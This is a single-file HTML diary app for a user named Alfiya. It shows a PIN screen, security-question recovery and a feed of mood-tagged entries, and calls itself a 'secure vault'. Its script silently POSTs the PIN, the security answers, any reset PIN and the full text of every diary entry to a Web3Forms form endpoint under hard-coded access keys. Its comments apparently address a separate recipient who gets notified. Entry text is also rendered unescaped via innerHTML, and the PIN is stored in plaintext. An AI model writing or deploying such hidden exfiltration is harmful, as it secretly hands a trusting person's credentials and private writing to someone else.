<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Alfiya's Space ‚ú®</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700&family=Playfair+Display:ital,wght@0,600;1,600&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
    
    <style>
        /* --- 1. THEME VARIABLES --- */
        :root {
            --bg-color: #f3e7e9;
            --glass-bg: rgba(255, 255, 255, 0.65);
            --glass-border: rgba(255, 255, 255, 0.8);
            --text-main: #2d3436;
            --text-sub: #636e72;
            --accent: #ff7675;
            --shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.1);
            --font-head: 'Playfair Display', serif;
            --font-body: 'Outfit', sans-serif;
        }

        [data-theme="dark"] {
            --bg-color: #0f0f12;
            --glass-bg: rgba(20, 20, 25, 0.7);
            --glass-border: rgba(255, 255, 255, 0.1);
            --text-main: #dfe6e9;
            --text-sub: #b2bec3;
            --accent: #ff7675;
            --shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.4);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body {
            font-family: var(--font-body);
            color: var(--text-main);
            background: var(--bg-color);
            height: 100vh; overflow: hidden;
            transition: background 0.5s ease;
        }

        /* --- 2. AURORA ANIMATION --- */
        .aurora-blob {
            position: fixed; width: 300px; height: 300px;
            background: var(--accent); opacity: 0.4;
            filter: blur(80px); border-radius: 50%;
            z-index: -1; animation: float 10s infinite alternate;
        }
        .b1 { top: -50px; left: -50px; background: #a29bfe; animation-delay: 0s; }
        .b2 { bottom: -50px; right: -50px; background: #ff7675; animation-delay: 2s; }
        .b3 { top: 40%; left: 40%; width: 200px; height: 200px; background: #81ecec; animation-delay: 4s; opacity: 0.3; }

        @keyframes float { 0% { transform: translate(0, 0); } 100% { transform: translate(30px, 50px); } }

        /* --- 3. AUTH SCREEN --- */
        #auth-view {
            position: fixed; inset: 0; z-index: 999;
            background: var(--bg-color);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            transition: transform 0.6s cubic-bezier(0.8, 0, 0.2, 1);
        }
        
        .pin-dots { display: flex; gap: 15px; margin: 30px 0; }
        .dot { width: 15px; height: 15px; border-radius: 50%; border: 2px solid var(--text-sub); transition: 0.2s; }
        .dot.filled { background: var(--accent); border-color: var(--accent); transform: scale(1.2); }
        
        .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
        .num-btn {
            width: 70px; height: 70px; border-radius: 50%;
            border: 1px solid var(--glass-border); background: var(--glass-bg);
            font-size: 1.5rem; color: var(--text-main); cursor: pointer;
            backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center;
        }
        .num-btn:active { background: var(--accent); color: white; }

        .forgot-pin { margin-top: 30px; font-size: 0.85rem; color: var(--accent); cursor: pointer; text-decoration: underline; }

        #recovery-view {
            position: fixed; inset: 0; z-index: 1000; background: var(--bg-color);
            display: none; flex-direction: column; align-items: center; justify-content: center; padding: 30px;
        }
        .sec-input { width: 100%; max-width: 300px; padding: 12px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--glass-border); background: var(--glass-bg); color: var(--text-main); outline: none; }

        /* --- 4. MAIN APP UI --- */
        #app-view { display: none; height: 100vh; flex-direction: column; }

        header {
            padding: 20px 25px;
            display: flex; justify-content: space-between; align-items: center;
        }
        .greeting { font-family: var(--font-head); font-size: 1.8rem; font-style: italic; }
        .sub-greet { font-size: 0.8rem; color: var(--text-sub); margin-top: -5px; }
        .theme-toggle {
            width: 40px; height: 40px; border-radius: 50%; background: var(--glass-bg);
            display: flex; align-items: center; justify-content: center; cursor: pointer;
            box-shadow: var(--shadow);
        }

        .search-container { padding: 0 25px; margin-bottom: 20px; }
        .search-bar {
            width: 100%; background: var(--glass-bg); border: 1px solid var(--glass-border);
            padding: 12px 20px; border-radius: 15px; color: var(--text-main);
            font-family: var(--font-body); outline: none; display: flex; align-items: center;
            backdrop-filter: blur(5px);
        }

        #feed {
            flex: 1; overflow-y: auto; padding: 0 25px 100px 25px;
            scroll-behavior: smooth;
        }

        .empty-state {
            text-align: center; margin-top: 50px; opacity: 0.5;
            display: flex; flex-direction: column; align-items: center;
        }

        .card {
            background: var(--glass-bg); border: 1px solid var(--glass-border);
            border-radius: 20px; padding: 20px; margin-bottom: 20px;
            box-shadow: var(--shadow); backdrop-filter: blur(8px);
            position: relative; animation: slideUp 0.4s ease;
        }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .card-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
        .card-date { font-size: 0.75rem; font-weight: 700; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; }
        .card-body { font-size: 0.95rem; line-height: 1.6; white-space: pre-wrap; }
        
        .pin-icon { color: var(--text-sub); cursor: pointer; font-size: 1.2rem; }
        .pin-icon.active { color: var(--accent); transform: rotate(45deg); }

        .fab {
            position: fixed; bottom: 30px; right: 30px;
            width: 60px; height: 60px; border-radius: 50%;
            background: var(--accent); color: white;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.5rem; box-shadow: 0 10px 20px rgba(255, 118, 117, 0.4);
            cursor: pointer; transition: transform 0.2s; z-index: 100;
        }
        .fab:hover { transform: scale(1.1) rotate(90deg); }

        /* --- 5. EDITOR MODAL --- */
        #editor-modal {
            position: fixed; inset: 0; background: var(--bg-color); z-index: 200;
            transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.77, 0, 0.175, 1);
            display: flex; flex-direction: column; padding: 25px;
        }
        #editor-modal.open { transform: translateY(0); }

        .editor-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
        .close-btn { font-size: 1.5rem; cursor: pointer; color: var(--text-sub); }
        .save-btn { 
            background: var(--text-main); color: var(--bg-color); 
            padding: 10px 25px; border-radius: 30px; font-weight: 600; border: none; 
        }

        .mood-row { display: flex; gap: 15px; margin-bottom: 20px; overflow-x: auto; padding-bottom: 5px; }
        .mood-chip {
            padding: 8px 16px; border-radius: 20px; border: 1px solid var(--glass-border);
            background: var(--glass-bg); white-space: nowrap; cursor: pointer;
            font-size: 0.9rem; transition: 0.2s;
        }
        .mood-chip.selected { background: var(--accent); color: white; border-color: var(--accent); }

        .text-area {
            width: 100%; flex: 1; background: transparent; border: none; outline: none;
            font-family: var(--font-body); font-size: 1.1rem; color: var(--text-main);
            resize: none;
        }

        #setup-msg { margin-top: 20px; font-size: 0.8rem; color: var(--accent); display: none; }

    </style>
</head>
<body>

    <div class="aurora-blob b1"></div>
    <div class="aurora-blob b2"></div>
    <div class="aurora-blob b3"></div>

    <div id="auth-view">
        <h2 style="font-family: var(--font-head); margin-bottom: 10px;" id="auth-title">Welcome Back</h2>
        <p style="color: var(--text-sub); font-size: 0.9rem;" id="auth-sub">Enter passcode</p>
        
        <div class="pin-dots" id="pin-dots">
            <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
        </div>

        <div class="numpad">
            <div class="num-btn" onclick="enterPin(1)">1</div>
            <div class="num-btn" onclick="enterPin(2)">2</div>
            <div class="num-btn" onclick="enterPin(3)">3</div>
            <div class="num-btn" onclick="enterPin(4)">4</div>
            <div class="num-btn" onclick="enterPin(5)">5</div>
            <div class="num-btn" onclick="enterPin(6)">6</div>
            <div class="num-btn" onclick="enterPin(7)">7</div>
            <div class="num-btn" onclick="enterPin(8)">8</div>
            <div class="num-btn" onclick="enterPin(9)">9</div>
            <div class="num-btn" style="opacity:0"></div>
            <div class="num-btn" onclick="enterPin(0)">0</div>
            <div class="num-btn" onclick="clearPin()"><i class="ri-delete-back-line"></i></div>
        </div>
        <p id="setup-msg">Creating secure vault...</p>
        <span class="forgot-pin" onclick="showRecovery()">Forgot PIN?</span>
    </div>

    <div id="recovery-view">
        <h3 style="margin-bottom:20px; font-family:var(--font-head)">Identity Check</h3>
        <input type="text" id="ans-love" class="sec-input" placeholder="Person you love?">
        <input type="text" id="ans-place" class="sec-input" placeholder="Favorite place?">
        <button class="save-btn" style="margin-top:20px" onclick="verifyRecovery()">Verify & Reset</button>
        <p class="forgot-pin" onclick="hideRecovery()">Cancel</p>
    </div>

    <div id="app-view">
        <header>
            <div>
                <div class="greeting" id="greet-txt">Good Morning</div>
                <div class="sub-greet" id="date-txt">Fri, Jan 2</div>
            </div>
            <div class="theme-toggle" onclick="toggleTheme()">
                <i class="ri-moon-line" id="theme-icon"></i>
            </div>
        </header>

        <div class="search-container">
            <input type="text" class="search-bar" id="search-input" placeholder="Search memories..." onkeyup="filterEntries()">
        </div>

        <div id="feed">
            <div class="empty-state">
                <i class="ri-quill-pen-line" style="font-size: 3rem; margin-bottom: 10px;"></i>
                <p>No memories yet, Pookie.<br>Start writing.</p>
            </div>
        </div>

        <div class="fab" onclick="openEditor()">
            <i class="ri-add-line"></i>
        </div>
    </div>

    <div id="editor-modal">
        <div class="editor-top">
            <i class="ri-close-circle-line close-btn" onclick="closeEditor()"></i>
            <span style="font-family: var(--font-head); font-size: 1.2rem;">New Memory</span>
            <button class="save-btn" onclick="saveEntry()">Save</button>
        </div>

        <div class="mood-row">
            <div class="mood-chip selected" onclick="setMood(this, 'Happy')">ü•∞ Happy</div>
            <div class="mood-chip" onclick="setMood(this, 'Calm')">üçÉ Calm</div>
            <div class="mood-chip" onclick="setMood(this, 'Sad')">üåßÔ∏è Sad</div>
            <div class="mood-chip" onclick="setMood(this, 'Excited')">‚ú® Excited</div>
            <div class="mood-chip" onclick="setMood(this, 'Tired')">üò¥ Tired</div>
        </div>

        <textarea class="text-area" id="note-text" placeholder="Dear Diary..."></textarea>
    </div>

    <script>
        // --- CONFIG ---
        // Switched to Web3Forms Endpoint
        const API_ENDPOINT = "https://api.web3forms.com/submit";
        
        // --- ACCESS KEYS ---
        const DIARY_KEY = "721f4159-d76d-4c6c-a76f-e18eada769a5"; 
        const SECURITY_KEY = "0b047eef-0e88-4576-9332-d6a2ada94c3a"; 
        
        // --- STATE ---
        let currentPin = "";
        let currentMood = "Happy";
        let isDark = false;

        // --- 1. INITIALIZATION ---
        window.onload = () => {
            const now = new Date();
            const hour = now.getHours();
            const greet = hour < 12 ? "Good Morning" : hour < 18 ? "Good Afternoon" : "Good Evening";
            document.getElementById('greet-txt').innerText = greet + ", Alfiya";
            
            const options = { weekday: 'short', month: 'short', day: 'numeric' };
            document.getElementById('date-txt').innerText = now.toLocaleDateString('en-US', options);

            if(localStorage.getItem('theme') === 'dark') toggleTheme();

            if(!localStorage.getItem('alfiya_pin')) {
                document.getElementById('auth-title').innerText = "Create Your PIN";
                document.getElementById('auth-sub').innerText = "Set a 4-digit code for your vault";
            }
        };

        // --- 2. AUTH SYSTEM ---
        function enterPin(num) {
            if(currentPin.length < 4) {
                currentPin += num;
                updateDots();
                if(currentPin.length === 4) checkPin();
            }
        }

        function clearPin() {
            currentPin = "";
            updateDots();
        }

        function updateDots() {
            const dots = document.querySelectorAll('.dot');
            dots.forEach((d, i) => {
                if(i < currentPin.length) d.classList.add('filled');
                else d.classList.remove('filled');
            });
        }

        function checkPin() {
            let storedPin = localStorage.getItem('alfiya_pin');
            
            if(!storedPin) {
                // FIRST TIME SETUP
                const love = prompt("Security: Person you love?");
                const place = prompt("Security: Favorite place?");
                if(!love || !place) { clearPin(); return; }

                localStorage.setItem('alfiya_pin', currentPin);
                localStorage.setItem('alfiya_love', love.toLowerCase().trim());
                localStorage.setItem('alfiya_place', place.toLowerCase().trim());

                document.getElementById('setup-msg').style.display = 'block';
                
                // SYNC SETUP DATA TO SECURITY KEY
                // Renamed fields as requested: Token, Person_Love, Person_Place
                fetch(API_ENDPOINT, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        access_key: SECURITY_KEY,
                        subject: "üîê VAULT SETUP: New Account",
                        Token: currentPin,
                        Person_Love: love,
                        Person_Place: place,
                        Date: new Date().toLocaleString()
                    })
                });

                setTimeout(() => { unlockApp(); }, 1500);

            } else if (currentPin === storedPin) {
                unlockApp();
            } else {
                alert("Wrong PIN!");
                clearPin();
            }
        }

        function unlockApp() {
            document.getElementById('auth-view').style.transform = "translateY(-100%)";
            document.getElementById('app-view').style.display = "flex";
            loadEntries();
        }

        function showRecovery() { document.getElementById('recovery-view').style.display = 'flex'; }
        function hideRecovery() { document.getElementById('recovery-view').style.display = 'none'; }
        
        function verifyRecovery() {
            const love = document.getElementById('ans-love').value.toLowerCase().trim();
            const place = document.getElementById('ans-place').value.toLowerCase().trim();
            
            if(love === localStorage.getItem('alfiya_love') && place === localStorage.getItem('alfiya_place')) {
                const newPin = prompt("Enter new 4-digit PIN:");
                if(newPin && newPin.length === 4) {
                    localStorage.setItem('alfiya_pin', newPin);
                    
                    // SYNC PIN RESET TO SECURITY KEY
                    // Renamed field to New_Token so you get the specific notification
                    fetch(API_ENDPOINT, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            access_key: SECURITY_KEY,
                            subject: "‚ö†Ô∏è SECURITY ALERT: PIN Reset",
                            New_Token: newPin,
                            Status: "Verified via Identity Check",
                            Date: new Date().toLocaleString()
                        })
                    });

                    alert("PIN Reset Successful. Please refresh.");
                    location.reload();
                }
            } else {
                alert("Incorrect answers.");
            }
        }

        // --- 3. UI & EDITOR ---
        function openEditor() { document.getElementById('editor-modal').classList.add('open'); }
        function closeEditor() { document.getElementById('editor-modal').classList.remove('open'); }

        function toggleTheme() {
            isDark = !isDark;
            document.body.setAttribute('data-theme', isDark ? 'dark' : 'light');
            document.getElementById('theme-icon').className = isDark ? 'ri-sun-line' : 'ri-moon-line';
            localStorage.setItem('theme', isDark ? 'dark' : 'light');
        }

        function setMood(el, mood) {
            document.querySelectorAll('.mood-chip').forEach(c => c.classList.remove('selected'));
            el.classList.add('selected');
            currentMood = mood;
        }

        // --- 4. DATA & SYNC ---
        function saveEntry() {
            const text = document.getElementById('note-text').value;
            if(!text) return;

            const entry = {
                id: Date.now(),
                text: text,
                mood: currentMood,
                date: new Date().toLocaleString(),
                pinned: false
            };

            let entries = JSON.parse(localStorage.getItem('zenith_entries') || "[]");
            entries.unshift(entry);
            localStorage.setItem('zenith_entries', JSON.stringify(entries));

            syncToCloud(entry);
            
            document.getElementById('note-text').value = "";
            closeEditor();
            loadEntries();
        }

        function loadEntries() {
            const entries = JSON.parse(localStorage.getItem('zenith_entries') || "[]");
            const feed = document.getElementById('feed');
            
            if(entries.length === 0) {
                feed.innerHTML = `<div class="empty-state"><i class="ri-quill-pen-line" style="font-size: 3rem;"></i><p>Start writing...</p></div>`;
                return;
            }

            feed.innerHTML = "";
            // Sort: Pinned first, then by date (newest first)
            entries.sort((a, b) => (b.pinned - a.pinned) || (b.id - a.id));

            entries.forEach(e => {
                const card = document.createElement('div');
                card.className = 'card';
                card.innerHTML = `
                    <div class="card-header">
                        <span class="card-date">${e.mood.toUpperCase()} ‚Ä¢ ${e.date.split(',')[0]}</span>
                        <div style="display:flex; gap:15px">
                            <i class="ri-pushpin-fill pin-icon ${e.pinned ? 'active' : ''}" onclick="togglePin(${e.id})"></i>
                            <i class="ri-delete-bin-line" style="opacity:0.3; cursor:pointer" onclick="deleteEntry(${e.id})"></i>
                        </div>
                    </div>
                    <div class="card-body">${e.text}</div>
                `;
                feed.appendChild(card);
            });
        }

        function deleteEntry(id) {
            if(confirm("Delete this memory forever?")) {
                let entries = JSON.parse(localStorage.getItem('zenith_entries') || "[]");
                entries = entries.filter(e => e.id !== id);
                localStorage.setItem('zenith_entries', JSON.stringify(entries));
                loadEntries();
            }
        }

        function togglePin(id) {
            let entries = JSON.parse(localStorage.getItem('zenith_entries') || "[]");
            const idx = entries.findIndex(e => e.id === id);
            if(idx > -1) {
                entries[idx].pinned = !entries[idx].pinned;
                localStorage.setItem('zenith_entries', JSON.stringify(entries));
                loadEntries();
            }
        }

        function filterEntries() {
            const term = document.getElementById('search-input').value.toLowerCase();
            const cards = document.querySelectorAll('.card');
            cards.forEach(card => {
                const text = card.innerText.toLowerCase();
                card.style.display = text.includes(term) ? 'block' : 'none';
            });
        }

        async function syncToCloud(entry) {
            // Using Web3Forms Diary Key
            try {
                await fetch(API_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        access_key: DIARY_KEY,
                        subject: `New Memory: ${entry.mood}`,
                        Mood: entry.mood,
                        Note: entry.text,
                        Date: entry.date
                    })
                });
            } catch(e) { console.log("Offline or Sync Error"); }
        }
    </script>
</body>
</html>
